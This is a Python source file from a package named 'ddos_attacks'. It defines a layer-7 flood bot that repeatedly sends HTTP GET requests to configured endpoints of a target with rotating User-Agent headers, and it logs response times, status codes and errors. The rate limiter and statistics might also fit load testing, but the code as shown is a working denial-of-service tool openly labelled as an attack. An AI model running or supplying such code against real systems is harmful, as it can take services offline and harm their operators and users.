import time
import asyncio
from ddos_attacks.utils import random_choice, load_config

ddos_config = load_config("ddos.json")
TARGET = ddos_config["l7"]["TARGET"]
ENDPOINTS = ddos_config["l7"]["ENDPOINTS"]
USER_AGENTS = ddos_config["l7"]["USER_AGENTS"]


class L7Bot:
    def __init__(self, num: int):
        self.target = TARGET
        self.endpoints = ENDPOINTS
        self.user_agents = USER_AGENTS
        self.name = f"bot{num}"
        self.text = None

    async def job(self, session, limiter, stats, stop_time):
        while time.time() < stop_time:
            await limiter.acquire()
            endpoint = random_choice(self.endpoints)
            headers = {"User-Agent": random_choice(self.user_agents)}
            start = time.time()
            try:
                async with session.get(self.target + endpoint, headers=headers, timeout=10) as resp:
                    self.text = await resp.text()
                    response_time = (time.time() - start) * 1000.0
                    stats['response_times'].append(response_time)
                    stats['http_codes'].append(resp.status)
            except Exception as e:
                stats['errors_count'] += 1
            await asyncio.sleep(0)